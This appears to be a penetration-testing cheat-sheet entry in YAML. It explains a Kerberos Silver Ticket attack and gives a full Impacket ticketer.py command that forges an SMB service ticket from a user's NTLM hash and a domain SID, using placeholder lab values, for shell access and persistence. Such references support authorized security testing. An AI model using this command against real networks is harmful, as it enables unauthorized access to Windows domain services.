---
description: |
  Impacket's ticketer.py can perform Silver Ticket attacks, which crafts a valid TGS ticket for a specific service using a valid user's NTLM hash. It is then possible to gain access to that service. The following command crafts a TGS for the SMB service, which can then be used to gain a shell.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Hash: b18b4b218eccad1c223306ea1916885f

  	Domain SID: S-1-5-21-1339291983-1349129144-367733775

  	SMB Service: cifs

command: |
  python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
items:
  - Username
  - Hash
services:
  - Kerberos
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---
